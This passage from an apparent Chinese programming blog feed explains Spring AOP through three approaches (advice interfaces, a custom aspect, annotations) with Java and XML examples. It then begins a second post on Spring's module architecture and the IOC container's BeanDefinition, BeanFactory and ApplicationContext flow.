<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">search</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span> &#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;增加用户&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">()</span> &#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;删除用户&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span> &#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;更新用户&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">search</span><span class="params">()</span> &#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;查询用户&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后去写我们的增强类 , 我们编写两个 , 一个前置增强 一个后置增强</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log</span> <span class="keyword">implements</span> <span class="title class_">MethodBeforeAdvice</span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//method : 要执行的目标对象的方法</span></span><br><span class="line">   <span class="comment">//objects : 被调用的方法的参数</span></span><br><span class="line">   <span class="comment">//Object : 目标对象</span></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">(Method method, Object[] objects, Object o)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">       System.out.println( o.getClass().getName() + <span class="string">&quot;的&quot;</span> + method.getName() + <span class="string">&quot;方法被执行了&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AfterLog</span> <span class="keyword">implements</span> <span class="title class_">AfterReturningAdvice</span> &#123;</span><br><span class="line">   <span class="comment">//returnValue 返回值</span></span><br><span class="line">   <span class="comment">//method被调用的方法</span></span><br><span class="line">   <span class="comment">//args 被调用的方法的对象的参数</span></span><br><span class="line">   <span class="comment">//target 被调用的目标对象</span></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterReturning</span><span class="params">(Object returnValue, Method method, Object[] args,Object target)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;执行了&quot;</span> + target.getClass().getName()</span><br><span class="line">       +<span class="string">&quot;的&quot;</span>+method.getName()+<span class="string">&quot;方法,&quot;</span></span><br><span class="line">       +<span class="string">&quot;返回值：&quot;</span>+returnValue);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后去spring的文件中注册 , 并实现aop切入实现 , 注意导入约束 .</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">xmlns:aop</span>=<span class="string">&quot;http://www.springframework.org/schema/aop&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://www.springframework.org/schema/aop</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://www.springframework.org/schema/aop/spring-aop.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">&lt;!--注册bean--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.service.UserServiceImpl&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;log&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.log.Log&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;afterLog&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.log.AfterLog&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">&lt;!--aop的配置--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--切入点 expression:表达式匹配要执行的方法--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">&quot;pointcut&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;execution(* com.kuang.service.UserServiceImpl.*(..))&quot;</span>/&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--执行环绕; advice-ref执行方法 . pointcut-ref切入点--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">&quot;log&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;pointcut&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">&quot;afterLog&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;pointcut&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>测试</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyTest</span> &#123;</span><br><span class="line">   <span class="meta">@Test</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">       <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> newClassPathXmlApplicationContext(<span class="string">&quot;beans.xml&quot;</span>);</span><br><span class="line">       <span class="type">UserService</span> <span class="variable">userService</span> <span class="operator">=</span> (UserService) context.getBean(<span class="string">&quot;userService&quot;</span>);</span><br><span class="line">       userService.search();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Aop的重要性 : 很重要 . 一定要理解其中的思路 , 主要是思想的理解这一块 .</p>
<p>Spring的Aop就是将公共的业务 (日志 , 安全等) 和领域业务结合起来 , 当执行领域业务时 , 将会把公共业务加进来 . 实现公共业务的重复利用 . 领域业务更纯粹 , 程序猿专注领域业务 , 其本质还是动态代理 . </p>
<h4 id="TIP"><a href="#TIP" class="headerlink" title="TIP"></a>TIP</h4><p>第一种方式是在原有的基础上创建了新类，继承了对应的接口，然后重写了对应的方法</p>
<p>之后在配置中确定什么时候切入执行</p>
<h3 id="第二种方式"><a href="#第二种方式" class="headerlink" title="第二种方式"></a><strong>第二种方式</strong></h3><p><strong>自定义类来实现Aop</strong></p>
<p>目标业务类不变依旧是userServiceImpl</p>
<p>第一步 : 写我们自己的一个切入类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DiyPointcut</span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">()</span>&#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;---------方法执行前---------&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">after</span><span class="params">()</span>&#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;---------方法执行后---------&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>去spring中配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--第二种方式自定义实现--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--注册bean--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;diy&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.config.DiyPointcut&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--aop的配置--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!--第二种方式：使用AOP的标签实现--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">aop:aspect</span> <span class="attr">ref</span>=<span class="string">&quot;diy&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">&quot;diyPonitcut&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;execution(* com.kuang.service.UserServiceImpl.*(..))&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">aop:before</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;diyPonitcut&quot;</span> <span class="attr">method</span>=<span class="string">&quot;before&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">aop:after</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;diyPonitcut&quot;</span> <span class="attr">method</span>=<span class="string">&quot;after&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">aop:aspect</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>测试：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyTest</span> &#123;</span><br><span class="line">   <span class="meta">@Test</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">       <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> newClassPathXmlApplicationContext(<span class="string">&quot;beans.xml&quot;</span>);</span><br><span class="line">       <span class="type">UserService</span> <span class="variable">userService</span> <span class="operator">=</span> (UserService) context.getBean(<span class="string">&quot;userService&quot;</span>);</span><br><span class="line">       userService.add();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="TIP-1"><a href="#TIP-1" class="headerlink" title="TIP"></a>TIP</h4><p>第二种方式和第一种方式的本质区别是在于不用继承某些接口，靠配置进行确定在什么时候执行函数</p>
<h3 id="第三种方式"><a href="#第三种方式" class="headerlink" title="第三种方式"></a><strong>第三种方式</strong></h3><p><strong>使用注解实现</strong></p>
<p>第一步：编写一个注解实现的增强类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.kuang.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.ProceedingJoinPoint;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.After;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.Around;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.Aspect;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.Before;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AnnotationPointcut</span> &#123;</span><br><span class="line">   <span class="meta">@Before(&quot;execution(* com.kuang.service.UserServiceImpl.*(..))&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">()</span>&#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;---------方法执行前---------&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@After(&quot;execution(* com.kuang.service.UserServiceImpl.*(..))&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">after</span><span class="params">()</span>&#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;---------方法执行后---------&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Around(&quot;execution(* com.kuang.service.UserServiceImpl.*(..))&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">around</span><span class="params">(ProceedingJoinPoint jp)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;环绕前&quot;</span>);</span><br><span class="line">       System.out.println(<span class="string">&quot;签名:&quot;</span>+jp.getSignature());</span><br><span class="line">       <span class="comment">//执行目标方法proceed</span></span><br><span class="line">       <span class="type">Object</span> <span class="variable">proceed</span> <span class="operator">=</span> jp.proceed();</span><br><span class="line">       System.out.println(<span class="string">&quot;环绕后&quot;</span>);</span><br><span class="line">       System.out.println(proceed);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第二步：在Spring配置文件中，注册bean，并增加支持注解的配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--第三种方式:注解实现--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;annotationPointcut&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.config.AnnotationPointcut&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:aspectj-autoproxy</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>aop:aspectj-autoproxy：说明</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">通过aop命名空间的&lt;aop:aspectj-autoproxy /&gt;</span><br><span class="line">声明自动为spring容器中那些配置@aspectJ切面的bean创建代理，织入切面。</span><br><span class="line">当然，spring 在内部依旧采用AnnotationAwareAspectJAutoProxyCreator进行自动代理的创建工作，但具体实现的细节已经被&lt;aop:aspectj-autoproxy /&gt;隐藏起来了</span><br><span class="line"></span><br><span class="line">&lt;aop:aspectj-autoproxy /&gt;有一个proxy-target-class属性，默认为<span class="literal">false</span>，表示使用jdk动态代理织入增强，</span><br><span class="line"></span><br><span class="line">当配为&lt;aop:aspectj-autoproxy  poxy-target-class=<span class="string">&quot;true&quot;</span>/&gt;时，表示使用CGLib动态代理技术织入增强。不过即使proxy-target-class设置为<span class="literal">false</span>，如果目标类没有声明接口，则spring将自动使用CGLib动态代理。</span><br></pre></td></tr></table></figure>























<p>我们在不改变原来的代码的情况下，实现了对原有功能的增强，这是AOP中最核心的思想</p>
<p>聊聊AOP：纵向开发，横向开发</p>
]]></content>
      <tags>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring 究极解析</title>
    <url>/2021/05/07/2021/Spring-%E7%A9%B6%E6%9E%81%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="Spring体系架构"><a href="#Spring体系架构" class="headerlink" title="Spring体系架构"></a>Spring体系架构</h1><p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/07/3ju5Fv7oixWAhbN.jpg"
                      alt="Screenshot_27.jpg"
                ></p>
<ol>
<li><strong>Core Container（核心容器）</strong></li>
</ol>
<p>该模块主要包含Core、Beans、Context和SpEL模块。其中Core和Beans是整个框架最基础的部分，提供**控制反转(IOC)<strong>和</strong>依赖注入(DI)**特性。这里最重要的概念就是BeanFactory，提供了以Factory模式的实现来消除对程序性单例模式。</p>
<ul>
<li>Core：模块主要包含Spring框架最基本的核心工具类，Core是其他组件的基础核心。</li>
<li>Beans：模块主要包含访问配置文件、创建&#x2F;管理Bean以及IOC&#x2F;DI相关的类。</li>
<li>Context：继承了Beans的特性，主要为Spring提供大量的扩展，如国际化、事件机制、资源加载等待。ApplicationContext接口是Context模块的关键。</li>
<li>SpEL：模块提供了一个强大的语言表达式。</li>
</ul>
<blockquote>
<p>回顾一下IOC和DI：</p>
<ul>
<li>IOC：反转控制，对象的控制权交给Spring的IOC容器管理，而不用我们通过<code>new</code>来创建，从而解耦。</li>
<li>DI：依赖注入，相对于反转控制更加具体的概念，某个对象需要依赖其它对象时，Spring会通过注入的方式将其所依赖的对象交给它使用。</li>
</ul>
</blockquote>
<ol>
<li><strong>AOP and Instrumentation</strong></li>
</ol>
<p>提供符合AOP Alliance标准的面向切面编程的实现，可以让你定义如方法拦截器和切点，从而降低程序之间的耦合性。 AspectJ模块提供了与<strong>AspectJ</strong>的集成。 而Instrumentation模块提供用于某些应用程序服务器的类工具支持和类加载器实现 。</p>
<ol>
<li><strong>Messaging</strong></li>
</ol>
<p>该模块具有来自Spring Integration项目的关键抽象，如Message、MessageChannel、MessageHandler等。它们构成基于消息的应用程序的基础。该模块还包括一组注释，用于将消息映射到方法，类似于基于Spring MVC注释的编程模型。</p>
<ol>
<li><strong>Data Access&#x2F;Integration</strong></li>
</ol>
<p>数据访问&#x2F;集成层由JDBC，ORM，OXM，JMS和事务模块组成。</p>
<ul>
<li>JDBC模块：提供了JDBC抽象层，从而无需进行繁琐的JDBC编码和数据库特定错误代码（不同数据代码可能不同）的解析。</li>
<li>事务模块：支持对实现特殊接口的类以及所有POJO（普通Java对象）进行编程和声明式事务管理。</li>
<li>ORM模块：该模块为当前流行的ORM（包括JPA，JDO和Hibernate）提供了集成层。使用ORM模块，可以将所有这些O&#x2F;R映射框架与Spring提供的所有功能结合使用，如前面提到的事务管理功能。</li>
<li>OXM模块：提供了一个抽象层，该抽象层支持Object&#x2F; XML映射实现，例如JAXB，Castor，XMLBeans，JiBX和XStream。JMS模块（Java Messaging Service）：包含用于生成和使用消息的功能。从Spring Framework 4.1开始，提供了与Spring­Messaging模块集成。</li>
</ul>
<ol>
<li><strong>Web</strong></li>
</ol>
<p>Web上下文模块建立在应用程序上下文模块之上，为基于Web的应用程序提供上下文支持。该模块包含Web、WebMVC、Web Socket和Web­Porlet模块。</p>
<ul>
<li>Web模块：提供了基本的面向Web的集成功能，如文件上传功能以及使用Servlet监听器和面向Web的应用程序上下文对IoC容器的初始化。</li>
<li>WebMVC模块（也称为Web­Servlet模块）：包含基于Spring的Model­View­Controller（MVC）支持和针对Web应用程序的Rest Web服务实现。</li>
<li>Web­Portlet 模块（也称为Web­Portlet模块）：提供Portlet环境中的MVC实现。</li>
</ul>
<ol>
<li><strong>Test</strong></li>
</ol>
<p>该模块支持使用JUnit或TestNG对Spring组件进行单元测试和集成测试。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/07/OHeCt7snk1K4Q8D.jpg"
                      alt="Screenshot_74.jpg"
                ></p>
<p>Spring最重要的概念是IOC 和 AOP，而其中IOC又是Spring中的根基。如果把Spring比作一棵树，那么IOC就是树根。</p>
<h1 id="SpringIOC源码整体流程"><a href="#SpringIOC源码整体流程" class="headerlink" title="SpringIOC源码整体流程"></a>SpringIOC源码整体流程</h1><p>本节我们会对SpringIOC整体流程的源码进行总体分析，主要介绍整体流程，很多细节的地方后续会单独做详细介绍。</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在使用Spring时，你一定见过这几个段代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过基于注解的ApplicationContext获取Bean</span></span><br><span class="line"><span class="type">AnnotationConfigApplicationContext</span> <span class="variable">applicationContext</span> </span><br><span class="line">    <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnnotationConfigApplicationContext</span>(MainConfig.class);</span><br><span class="line"><span class="type">User</span> <span class="variable">user1</span> <span class="operator">=</span> applicationContext.getBean(<span class="string">&quot;user&quot;</span>, User.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过基于xml的ApplicationContext获取Bean</span></span><br><span class="line"><span class="type">ClassPathXmlApplicationContext</span> <span class="variable">xmlApplicationContext</span> </span><br><span class="line">    <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;beans.xml&quot;</span>);</span><br><span class="line"><span class="type">User</span> <span class="variable">user2</span> <span class="operator">=</span> xmlApplicationContext.getBean(<span class="string">&quot;user&quot;</span>, User.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过BeanFactory获取Bean</span></span><br><span class="line"><span class="type">DefaultListableBeanFactory</span> <span class="variable">beanFactory</span> </span><br><span class="line">    <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultListableBeanFactory</span>();</span><br><span class="line"><span class="type">User</span> <span class="variable">user3</span> <span class="operator">=</span> beanFactory.getBean(<span class="string">&quot;user&quot;</span>, User.class);</span><br></pre></td></tr></table></figure>

<p>通过ApplicationContext或者BeanFactory，我们可以传入Bean的名称，从而获取Spring容器中的指定对象。</p>
<p>那ApplicationContext和BeanFactory是什么？有什么用？两者有何异同？</p>
<p>我们先来看下面一张图：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/07/h7bD5mf2guAZQ4s.jpg"
                      alt="Screenshot_26.jpg"
                ></p>
<p>可以看到，BeanFactory是用于访问Spring核心容器的根接口，它采用了典型的<strong>简单工厂模式</strong>，是用于生产Bean的一个Bean工厂，其提供了生产Bean所需的最基本规则。</p>
<p>而ApplicationContext则是BeanFactory的一个子类，它是核心容器中Context的核心，继承了Beans的特性，为Spring提供了大量扩展。</p>
<p>主要是对BeanFactory进行了扩展处理！</p>
<h2 id="IOC的大致流程"><a href="#IOC的大致流程" class="headerlink" title="IOC的大致流程"></a>IOC的大致流程</h2><p>Spring中整个IOC的大致流程如下：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/07/X4TUqmcu2EBWOs3.jpg"
                      alt="Screenshot_75.jpg"
                ></p>
<p>大致流程可以描述为：</p>
<p>ApplicationContext通过读取，扫描，注册得到BeanDefinition_Map，再交付给BeanFactory，委托其生产Bean，最终得到Bean单例池【其实也是个<code>Map&lt;name,Bean&gt;</code>。</p>
<h3 id="BeanDefinition"><a href="#BeanDefinition" class="headerlink" title="BeanDefinition"></a>BeanDefinition</h3><p>BeanDefinition是Bean在Spring中的描述，有了BeanDefinition我们就可以创建Bean。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/07/pSu97CLEwoWP5aD.jpg"
                      alt="Screenshot_76.jpg"
                ></p>
<blockquote>
<p>关于在Idea中如何做出上图：</p>
<p>首先点击某个接口右键得到拓扑图</p>
<p>在拓扑图中点击接口 Ctrl + Alt + B</p>
<p>再 Ctrl + A 全选，Enter导入</p>
</blockquote>
<p>BeanDefinition接口是顶级基础接口，用来描述Bean，里面存放Bean元数据。</p>
<p>比如Bean类名、scope、属性、构造函数参数列表、依赖的bean、是否是单例类、是否是懒加载等一些列信息。BeanDefinition的操作如下：</p>
<ul>
<li><p><strong>BeanDefinitionRegistry接口</strong>：有增、查、删BeanDefinition的能力，一次只能注册一个BeanDefinition。</p>
<p>实现类有<code>SimpleBeanDefinitionRegistry</code>、<code>DefaultListableBeanFactory</code>、<code>GenericApplicationContext</code>等。</p>
<p>一般实现类里都都有一个用来存储BeanDefinition的Map结构。</p>
</li>
<li><p><strong>BeanDefinitionReader接口</strong>： 既可以使用<code>BeanDefinitionRegistry</code>构造，也可以通过<code>loadBeanDefinitions </code>把配置加载为多个BeanDefinition并注册到BeanDefinitionRegistry中。 </p>
<p>可以说是高效版本的BeanDefinitionRegistry。实现类有 <code>XmlBeanDefinitionReader</code>用于从xml中读取BeanDefinition，和<code>PropertiesBeanDefinitionReader</code>从Properties文件读取BeanDefinition。</p>
</li>
<li><p><strong>AnnotatedBeanDefinitionReader类</strong>：对带有注解的BeanDefinition进行注册。</p>
</li>
<li><p><strong>ClassPathBeanDefinitionScanner类</strong>：可以扫描到<code>@Component</code>、<code>@Repository</code>、<code>@Service</code>、<code>@Controller</code>注解的BeanDefinition注册到容器中。</p>
</li>
</ul>
<h3 id="ApplicationContext和BeanFactory"><a href="#ApplicationContext和BeanFactory" class="headerlink" title="ApplicationContext和BeanFactory"></a>ApplicationContext和BeanFactory</h3><p>看了IOC的大致流程，我们可以简单总结一下ApplicationContext和BeanFactory的异同点。ApplicationContext继承自BeanFactory，它们俩的关系相当于<strong>销售商和工厂的关系</strong>：</p>
<table>
<thead>
<tr>
<th>Feature</th>
<th>BeanFactory</th>
<th>ApplicationContext</th>
</tr>
</thead>
<tbody><tr>
<td>Bean实例化&#x2F;装配</td>
<td>Yes</td>
<td>Yes</td>
</tr>
<tr>
<td>集成的生命周期管理</td>
<td>No</td>
<td>Yes</td>
</tr>
<tr>
<td>自动注册 BeanPostProcessor 后置处理器</td>
<td>No</td>
<td>Yes</td>
</tr>
<tr>
<td>自动注册 BeanFactoryPostProcessor 后置处理器</td>
<td>No</td>
<td>Yes</td>
</tr>
<tr>
<td>便利的 MessageSource 访问 (国际化)</td>
<td>No</td>
<td>Yes</td>
</tr>
<tr>
<td>内置 ApplicationEvent 事件发布机制</td>
<td>No</td>
<td>Yes</td>
</tr>
</tbody></table>
<p>可以看到，BeanFactory唯一的职责就是生产Bean。而ApplicationContext提供了大量的扩展点，相对于BeanFactory来说功能更为强大。</p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><h3 id="ApplicationContext的初始化"><a href="#ApplicationContext的初始化" class="headerlink" title="ApplicationContext的初始化"></a>ApplicationContext的初始化</h3><p>我们以AnnotationConfigApplicationContext(<strong>注解</strong>方式)为例来讲解IOC的流程(基于xml的流程会略有不同)：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>   &#123;</span><br><span class="line">   <span class="comment">// 加载spring上下文</span></span><br><span class="line">   <span class="type">AnnotationConfigApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span></span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">AnnotationConfigApplicationContext</span>(MainConfig.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们点进去看：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AnnotationConfigApplicationContext</span><span class="params">(Class&lt;?&gt;... annotatedClasses)</span> &#123;</span><br><span class="line">	<span class="comment">//调用构造函数</span></span><br><span class="line">	<span class="built_in">this</span>();</span><br><span class="line">	<span class="comment">//注册我们的配置类</span></span><br><span class="line">	register(annotatedClasses);</span><br><span class="line">	<span class="comment">//IOC容器刷新接口</span></span><br><span class="line">	refresh();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意到会先调用其父类的构造方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">GenericApplicationContext</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 调用父类的构造函数,为ApplicationContext spring上下文对象初始beanFactory</span></span><br><span class="line"><span class="comment">	 * 为啥是DefaultListableBeanFactory？我们去看BeanFactory接口的时候</span></span><br><span class="line"><span class="comment">	 * 发DefaultListableBeanFactory是最底层的实现，功能是最全的</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="built_in">this</span>.beanFactory = <span class="keyword">new</span> <span class="title class_">DefaultListableBeanFactory</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们原先知晓<code>DefaultListableBeanFactory</code>是最底层的类，实现了<code>BeanFactory</code>。</p>
<p>那么我们接着走下面的方法</p>
